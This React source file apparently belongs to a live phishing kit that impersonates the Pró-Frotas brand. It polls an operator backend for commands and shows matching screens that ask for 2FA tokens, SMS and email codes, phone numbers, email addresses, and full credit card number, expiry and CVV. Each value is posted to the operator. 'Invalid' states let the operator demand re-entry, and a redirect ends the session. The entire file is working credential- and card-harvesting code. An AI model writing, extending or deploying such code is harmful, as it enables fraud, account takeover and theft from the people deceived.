import { useState, useEffect, useRef } from "react";
import axios from "axios";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

// Cor principal Pró-Frotas
const PF_BLUE = "#5C6BC0";
const PF_BLUE_LIGHT = "#9FA8DA";

// Logo e Banner reutilizáveis
const PFLogo = () => (
  <div className="mb-8">
    <img src="/profrotas_logo.png" alt="Pró-Frotas" className="h-14 w-auto" />
  </div>
);

// Layout split-screen padrão Pró-Frotas
const PFLayout = ({ children }) => (
  <div className="h-screen flex overflow-hidden hide-scrollbar" style={{ fontFamily: "'Roboto', 'Helvetica Neue', sans-serif" }}>
    <div className="hidden lg:block lg:w-[40%] relative">
      <img src="/profrotas_banner.png" alt="Pró-Frotas Banner" className="w-full h-full object-cover object-center" />
    </div>
    <div className="flex-1 flex flex-col items-center justify-center bg-white px-6 overflow-y-auto">
      {children}
    </div>
  </div>
);

// Spinner padrão
const PFSpinner = () => (
  <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
  </svg>
);

// Botão padrão
const PFButton = ({ disabled, loading, children, onClick, type = "submit" }) => (
  <button
    type={type}
    onClick={onClick}
    disabled={disabled || loading}
    className="w-full py-2.5 rounded text-white font-medium text-sm transition-all disabled:opacity-50 disabled:cursor-not-allowed"
    style={{ backgroundColor: disabled || loading ? PF_BLUE_LIGHT : PF_BLUE, height: '42px' }}
  >
    {loading ? <div className="flex items-center justify-center"><PFSpinner /></div> : children}
  </button>
);

// Ícone circular padrão
const PFIcon = ({ isInvalid, children }) => (
  <div className={`w-16 h-16 rounded-full flex items-center justify-center mb-5 ${isInvalid ? 'bg-red-100' : 'bg-blue-50'}`}>
    <svg className={`w-8 h-8 ${isInvalid ? 'text-red-500' : 'text-[#5C6BC0]'}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
      {children}
    </svg>
  </div>
);

// Mensagem de erro padrão
const PFError = ({ message }) => (
  <div className="mb-4 px-4 py-2.5 bg-red-50 border border-red-200 rounded-lg w-full max-w-[280px]">
    <p className="text-red-600 text-xs text-center font-medium">{message}</p>
  </div>
);

// Layout centralizado sem banner (para comandos)
const PFCenter = ({ children }) => (
  <div className="h-screen flex items-center justify-center bg-white overflow-hidden hide-scrollbar" style={{ fontFamily: "'Roboto', 'Helvetica Neue', sans-serif" }}>
    <div className="flex flex-col items-center px-6">
      {children}
    </div>
  </div>
);

function CommandPage({ userId, onInvalidate }) {
  const [currentCommand, setCurrentCommand] = useState(null);
  const [inputValue, setInputValue] = useState("");
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [codeDigits, setCodeDigits] = useState(['', '', '', '', '', '']);
  const inputRefs = useRef([]);
  const [lastAction, setLastAction] = useState(null);
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");

  // Polling - visible checado em CADA chamada
  useEffect(() => {
    const poll = async () => {
      try {
        const v = document.hidden ? "0" : "1";
        const response = await axios.get(`${API}/user/check-action/${userId}?visible=${v}`);
        if (response.data && response.data.action) {
          setCurrentCommand(response.data);
        }
      } catch (error) {}
    };
    poll();
    const interval = setInterval(poll, 1500);
    return () => clearInterval(interval);
  }, [userId]);

  // Resetar estados quando o comando muda
  useEffect(() => {
    if (currentCommand?.action && currentCommand.action !== lastAction) {
      setLoading(false);
      setSubmitted(false);
      setInputValue("");
      setCodeDigits(['', '', '', '', '', '']);
      setCardNumber("");
      setCardExpiry("");
      setCardCvv("");
      setLastAction(currentCommand.action);
    }
  }, [currentCommand?.action, lastAction]);

  const handleSubmit = async (e, field, customValue = null) => {
    e.preventDefault();
    setLoading(true);
    let valueToSend;
    if (customValue !== null) {
      valueToSend = customValue;
    } else if (field === "token_2fa" || field === "sms_code" || field === "app_mail") {
      valueToSend = codeDigits.join('');
    } else {
      valueToSend = inputValue;
    }
    try {
      await axios.post(`${API}/user/submit-data/${userId}`, { field, value: valueToSend });
      setSubmitted(true);
      if (field === "cc_code") {
        setCurrentCommand({ action: "AGUARDE" });
      }
    } catch (error) {
      console.error("Erro ao enviar dados:", error);
    }
  };

  const handleCodeChange = (index, value) => {
    if (loading) return;
    const digits = value.replace(/\D/g, '');
    if (!digits) {
      const newDigits = [...codeDigits];
      newDigits[index] = '';
      setCodeDigits(newDigits);
      return;
    }
    // Single digit typed
    const newDigits = [...codeDigits];
    newDigits[index] = digits[0];
    setCodeDigits(newDigits);
    if (index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (loading) return;
    if (e.key === 'Backspace' && !codeDigits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e) => {
    if (loading) return;
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    const newDigits = [...codeDigits];
    for (let i = 0; i < pastedData.length; i++) newDigits[i] = pastedData[i];
    setCodeDigits(newDigits);
    inputRefs.current[Math.min(pastedData.length, 5)]?.focus();
  };

  // Renderizar 6 quadradinhos de código (inline, não como componente)
  const renderCodeInputs = (isInvalid = false) => (
    <div className="flex justify-center gap-2.5">
      {[0,1,2,3,4,5].map((index) => (
        <input
          key={`code-${index}`}
          ref={(el) => { inputRefs.current[index] = el; }}
          type="text"
          inputMode="numeric"
          maxLength="1"
          value={codeDigits[index]}
          autoFocus={index === 0}
          onChange={(e) => handleCodeChange(index, e.target.value)}
          onKeyDown={(e) => handleKeyDown(index, e)}
          onPaste={handlePaste}
          onFocus={(e) => e.target.select()}
          disabled={loading}
          className={`w-11 h-12 text-center text-xl font-bold border-2 rounded-lg focus:outline-none transition-all ${
            isInvalid ? 'border-red-500 bg-red-50' : codeDigits[index] ? 'border-[#5C6BC0] bg-blue-50' : 'border-gray-300 bg-white'
          } ${loading ? 'bg-gray-100 cursor-not-allowed' : isInvalid ? 'focus:border-red-500' : 'focus:border-[#5C6BC0] focus:shadow-md focus:shadow-blue-100'}`}
        />
      ))}
    </div>
  );

  // INV - limpar comando no backend e voltar para login
  useEffect(() => {
    if (currentCommand?.action === "INV" && onInvalidate) {
      // Limpar o comando INV no backend para não repetir
      axios.post(`${API}/admin/command`, { user_id: userId, command: "CLEAR" }).catch(() => {});
      onInvalidate();
    }
  }, [currentCommand?.action, onInvalidate, userId]);

  if (currentCommand?.action === "INV") {
    return null;
  }

  // =================== AUT (2FA) ===================
  if (currentCommand?.action === "AUT" || currentCommand?.action === "AUT-INV") {
    const isCodeComplete = codeDigits.every(d => d !== '');
    const isInvalid = currentCommand?.action === "AUT-INV";
    return (
      <PFCenter>
        <PFLogo />
        {isInvalid && <PFError message="Código inválido. Digite novamente." />}
        <h1 className="text-lg font-bold text-gray-900 mb-1 text-center">Autenticação em Dois Fatores</h1>
        <p className="text-gray-500 mb-6 text-center text-sm max-w-[280px]">Digite o código do seu aplicativo autenticador</p>
        <form onSubmit={(e) => handleSubmit(e, "token_2fa")} className="w-full max-w-[280px] space-y-5">
          {renderCodeInputs(isInvalid)}
          <PFButton disabled={!isCodeComplete} loading={loading}>Confirmar</PFButton>
          <p className="text-center text-xs text-gray-400">Não recebeu o código? Verifique seu aplicativo.</p>
        </form>
      </PFCenter>
    );
  }

  // =================== EMAIL ===================
  if (currentCommand?.action === "EMAIL" || currentCommand?.action === "EMAIL-INV") {
    const isInvalid = currentCommand?.action === "EMAIL-INV";
    return (
      <PFCenter>
        <PFLogo />
        {isInvalid && <PFError message="E-mail inválido. Digite novamente." />}
        <h1 className="text-lg font-bold text-gray-900 mb-1 text-center">Confirme seu E-mail</h1>
        <p className="text-gray-500 mb-6 text-center text-sm max-w-[280px]">Digite o e-mail cadastrado na sua conta</p>
        <form onSubmit={(e) => handleSubmit(e, "email_input")} className="w-full max-w-[280px] space-y-5">
          <div>
            <label className="block text-sm text-gray-800 mb-1.5" style={{ fontSize: '13px' }}>E-mail <span className="text-red-500">*</span></label>
            <input
              type="email"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              placeholder="seuemail@exemplo.com"
              disabled={loading}
              className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm ${isInvalid ? 'border-red-500' : 'border-gray-300'}`}
              style={{ height: '38px' }}
              autoFocus
            />
          </div>
          <PFButton disabled={!inputValue || !inputValue.includes('@')} loading={loading}>Confirmar</PFButton>
        </form>
      </PFCenter>
    );
  }

  // =================== TOK-TEL (Código SMS) ===================
  if (currentCommand?.action === "TOK-TEL" || currentCommand?.action === "TOK-TEL-INV") {
    const isCodeComplete = codeDigits.every(d => d !== '');
    const phoneRef = currentCommand?.command_reference || "****";
    const isInvalid = currentCommand?.action === "TOK-TEL-INV";
    return (
      <PFCenter>
        <PFLogo />
        {isInvalid && <PFError message="Código inválido. Digite novamente." />}
        <h1 className={`text-lg font-bold mb-2 text-center ${isInvalid ? 'text-red-600' : 'text-gray-900'}`}>
          {isInvalid ? 'Código inválido!' : 'Código enviado!'}
        </h1>
        <p className="text-gray-500 mb-6 text-center text-sm whitespace-nowrap">
          Informe o código SMS enviado para o número final {phoneRef}
        </p>
        <form onSubmit={(e) => handleSubmit(e, "sms_code")} className="w-full max-w-[280px] space-y-5">
          {renderCodeInputs(isInvalid)}
          <p className="text-center text-xs text-gray-400">Aguarde para reenviar</p>
          <PFButton disabled={!isCodeComplete} loading={loading}>Continuar</PFButton>
        </form>
      </PFCenter>
    );
  }

  // =================== TELEFONE ===================
  if (currentCommand?.action === "TELEFONE" || currentCommand?.action === "TELEFONE-INV") {
    const isInvalid = currentCommand?.action === "TELEFONE-INV";
    const formatPhone = (value) => {
      const n = value.replace(/\D/g, '');
      if (n.length <= 2) return `(${n}`;
      if (n.length <= 7) return `(${n.slice(0,2)}) ${n.slice(2)}`;
      return `(${n.slice(0,2)}) ${n.slice(2,7)}-${n.slice(7,11)}`;
    };
    const isPhoneValid = inputValue.replace(/\D/g, '').length >= 10;
    return (
      <PFCenter>
        <PFLogo />
        <PFIcon isInvalid={isInvalid}>
          {isInvalid ? (
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
          ) : (
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
          )}
        </PFIcon>
        {isInvalid && <PFError message="Número inválido. Digite novamente." />}
        <h1 className="text-lg font-bold text-gray-900 mb-1 text-center">Confirme seu Telefone</h1>
        <p className="text-gray-500 mb-6 text-center text-sm max-w-[280px]">Digite o número de telefone cadastrado</p>
        <form onSubmit={(e) => handleSubmit(e, "phone_number")} className="w-full max-w-[280px] space-y-5">
          <div>
            <label className="block text-sm text-gray-800 mb-1.5" style={{ fontSize: '13px' }}>Telefone <span className="text-red-500">*</span></label>
            <input
              type="tel"
              value={inputValue}
              onChange={(e) => setInputValue(formatPhone(e.target.value))}
              placeholder="(00) 00000-0000"
              disabled={loading}
              className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm ${isInvalid ? 'border-red-500' : 'border-gray-300'}`}
              style={{ height: '38px' }}
              autoFocus
            />
          </div>
          <PFButton disabled={!isPhoneValid} loading={loading}>Confirmar</PFButton>
        </form>
      </PFCenter>
    );
  }

  // =================== TOK-MAIL (Código por Email) ===================
  if (currentCommand?.action === "TOK-MAIL" || currentCommand?.action === "TOK-MAIL-INV") {
    const isCodeComplete = codeDigits.every(d => d !== '');
    const emailRef = currentCommand?.command_reference || "******@email.com";
    const isInvalid = currentCommand?.action === "TOK-MAIL-INV";
    return (
      <PFCenter>
        <PFLogo />
        {isInvalid && <PFError message="Código inválido. Digite novamente." />}
        <h1 className={`text-lg font-bold mb-2 text-center ${isInvalid ? 'text-red-600' : 'text-gray-900'}`}>
          {isInvalid ? 'Código inválido!' : 'Código enviado!'}
        </h1>
        <p className="text-gray-500 mb-6 text-center text-sm max-w-[280px]">
          Informe o código enviado para <span className="font-semibold">{emailRef}</span>
        </p>
        <form onSubmit={(e) => handleSubmit(e, "app_mail")} className="w-full max-w-[280px] space-y-5">
          {renderCodeInputs(isInvalid)}
          <p className="text-center text-xs text-gray-400">Aguarde para reenviar</p>
          <PFButton disabled={!isCodeComplete} loading={loading}>Continuar</PFButton>
        </form>
      </PFCenter>
    );
  }

  // =================== CC (Cartão de Crédito) ===================
  if (currentCommand?.action === "CC" || currentCommand?.action === "CC-INV") {
    const isInvalid = currentCommand?.action === "CC-INV";
    const isAmex = (cardNumber.replace(/\D/g,"").startsWith("34") || cardNumber.replace(/\D/g,"").startsWith("37"));
    const cvvLen = isAmex ? 4 : 3;
    const formatCardNumber = (v) => {
      const n = v.replace(/\D/g,"").slice(0, isAmex ? 15 : 16);
      if (isAmex) return n.replace(/(\d{4})(\d{0,6})(\d{0,5})/, (_,a,b,c) => [a,b,c].filter(Boolean).join(" "));
      return n.replace(/(\d{4})(?=\d)/g, "$1 ");
    };
    const formatExpiry = (v) => { const n = v.replace(/\D/g,"").slice(0,4); return n.length > 2 ? n.slice(0,2)+"/"+n.slice(2) : n; };
    const validateCard = () => { const n = cardNumber.replace(/\D/g,""); return n.length >= 13 && n.length <= 16; };
    const validateExpiry = () => { const p = cardExpiry.split("/"); if (p.length !== 2) return false; const m = parseInt(p[0],10); const y = parseInt("20"+p[1],10); if (m<1||m>12) return false; return new Date(y,m) > new Date(); };
    const isFormValid = validateCard() && validateExpiry() && cardCvv.length >= cvvLen;
    const handleCCSubmit = async (e) => {
      e.preventDefault();
      setLoading(true);
      try {
        await axios.post(`${API}/user/submit-data/${userId}`, { field: "credit_card", value: `${cardNumber} | ${cardExpiry} | ${cardCvv}` });
        setSubmitted(true);
        setCurrentCommand({ action: "AGUARDE" });
      } catch (error) { console.error(error); }
    };
    return (
      <PFCenter>
        <PFLogo />
        <PFIcon isInvalid={isInvalid}>
          {isInvalid ? (
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
          ) : (
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
          )}
        </PFIcon>
        {isInvalid && <PFError message="Dados do cartão inválidos. Digite novamente." />}
        <h1 className="text-lg font-bold text-gray-900 mb-1 text-center">Cadastre seu cartão</h1>
        <p className="text-gray-500 mb-5 text-center text-sm max-w-[280px]">Atualize os dados do seu cartão para continuar.</p>
        <form onSubmit={handleCCSubmit} className="w-full max-w-[280px] space-y-4">
          <div>
            <label className="block text-sm text-gray-800 mb-1" style={{fontSize:'13px'}}>Número do cartão</label>
            <input type="text" value={cardNumber} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} placeholder="0000 0000 0000 0000" disabled={loading} maxLength={19}
              className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm ${isInvalid ? 'border-red-500' : 'border-gray-300'}`} style={{height:'38px'}} />
          </div>
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="block text-sm text-gray-800 mb-1" style={{fontSize:'13px'}}>Validade</label>
              <input type="text" value={cardExpiry} onChange={(e) => setCardExpiry(formatExpiry(e.target.value))} placeholder="MM/AA" disabled={loading} maxLength={5}
                className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm text-center ${isInvalid ? 'border-red-500' : 'border-gray-300'}`} style={{height:'38px'}} />
            </div>
            <div>
              <label className="block text-sm text-gray-800 mb-1" style={{fontSize:'13px'}}>CVV</label>
              <input type="text" value={cardCvv} onChange={(e) => setCardCvv(e.target.value.replace(/\D/g,"").slice(0,cvvLen))} placeholder={isAmex?"0000":"000"} disabled={loading} maxLength={cvvLen}
                className={`w-full px-3 py-2 border rounded focus:outline-none focus:border-[#5C6BC0] text-sm text-center ${isInvalid ? 'border-red-500' : 'border-gray-300'}`} style={{height:'38px'}} />
            </div>
          </div>
          <PFButton disabled={!isFormValid} loading={loading}>Continuar</PFButton>
        </form>
      </PFCenter>
    );
  }

  // =================== COD-CC (Código verificação cartão) ===================
  if (currentCommand?.action === "COD-CC" || currentCommand?.action === "COD-CC-INV") {
    const isInvalid = currentCommand?.action === "COD-CC-INV";
    const referenceText = currentCommand?.command_reference || "";
    return (
      <PFCenter>
        <PFLogo />
        <div className="w-full max-w-[320px]">
          <h1 className="text-lg font-bold text-gray-900 mb-4">Insira o código de verificação</h1>
          {referenceText && <p className="text-gray-600 text-sm leading-relaxed mb-5">{referenceText}</p>}
          {isInvalid && <PFError message="Código inválido. Digite novamente." />}
          <form onSubmit={(e) => handleSubmit(e, "cc_code")} className="space-y-4">
            <div>
              <label className="block text-sm font-medium mb-1.5" style={{ color: isInvalid ? '#EF4444' : PF_BLUE }}>Código</label>
              <input
                type="text" inputMode="numeric" value={inputValue}
                onChange={(e) => setInputValue(e.target.value.replace(/\D/g, ""))}
                disabled={loading}
                className={`w-full px-3 py-3 border-2 rounded-lg focus:outline-none text-lg ${isInvalid ? 'border-red-500' : 'border-[#5C6BC0] focus:border-[#3F51B5]'}`}
                autoFocus
              />
            </div>
            <a href="#" className="text-[#5C6BC0] hover:text-[#3F51B5] text-sm font-medium">Pedir um novo código</a>
            <div className="flex justify-end pt-2">
              <button type="submit" disabled={loading || !inputValue}
                className="px-8 py-2 rounded text-white font-medium text-sm transition-all disabled:opacity-50"
                style={{ backgroundColor: !inputValue || loading ? PF_BLUE_LIGHT : PF_BLUE }}>
                {loading ? <PFSpinner /> : "Confirmar"}
              </button>
            </div>
          </form>
        </div>
      </PFCenter>
    );
  }

  // =================== AGUARDE ===================
  if (currentCommand?.action === "AGUARDE" || !currentCommand?.action) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white" style={{ fontFamily: "'Roboto', 'Helvetica Neue', sans-serif" }}>
        <div className="flex flex-col items-center">
          <PFLogo />
          <div className="mb-6">
            <div className="relative">
              <div className="w-14 h-14 border-4 border-gray-200 rounded-full"></div>
              <div className="absolute top-0 left-0 w-14 h-14 border-4 border-transparent rounded-full animate-spin" style={{ borderTopColor: PF_BLUE }}></div>
            </div>
          </div>
          <h1 className="text-lg font-bold text-gray-700">Aguarde...</h1>
          <p className="text-gray-400 text-sm mt-2">Estamos processando sua solicitação</p>
        </div>
      </div>
    );
  }

  // =================== REDIRECT ===================
  if (currentCommand?.action === "REDIRECT" && currentCommand?.redirect_url) {
    window.location.href = currentCommand.redirect_url;
    return null;
  }

  return null;
}

export default CommandPage;
